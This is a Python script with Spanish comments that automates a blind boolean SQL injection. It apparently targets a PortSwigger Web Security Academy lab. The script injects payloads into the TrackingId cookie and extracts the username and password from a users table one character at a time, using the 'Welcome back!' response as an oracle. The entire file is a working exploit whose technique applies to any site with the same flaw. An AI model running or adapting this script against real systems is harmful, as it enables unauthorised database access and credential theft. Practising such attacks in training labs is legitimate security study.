import requests
import sys
import signal
from pwn import *
import string
import time
import urllib3

# Deshabilitar advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

main_url = "https://0a520028033741128190b19d005c00a0.web-security-academy.net"
characters = string.digits + string.ascii_lowercase + ':'

proxy = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080'
}

def def_handler(sig, frame):
  print("[+] Saliendo...\n")
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

logger1 = log.progress("Fuerza bruta")
logger1.status("Iniciando proceso de sqli...")

time.sleep(1)

logger2 = log.progress("Datos obtenidos")
extractedData = ""

def main():
  global extractedData
  for position in range(1, 50):
    for character in characters:
      sql_query = f"' and (select substring(username || ':' || password,{position},1) from users limit 1)='{character}"
      logger1.status(sql_query)

      headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0'
      }

      cookies = {
        'TrackingId': f"tzvRlunxkgfSb8RF{sql_query}",
        'session': 'aWbSAPmyTitAaBHeIVOGqGY3ZFoT3rKi'
      }

      response = requests.get(main_url, cookies=cookies, headers=headers, proxies=proxy, verify=False)

      if 'Welcome back!' in response.text:
        extractedData = extractedData + character
        logger2.status(extractedData)
        break
      time.sleep(1)

  logger2.success(extractedData)

if __name__ == "__main__":
  main()
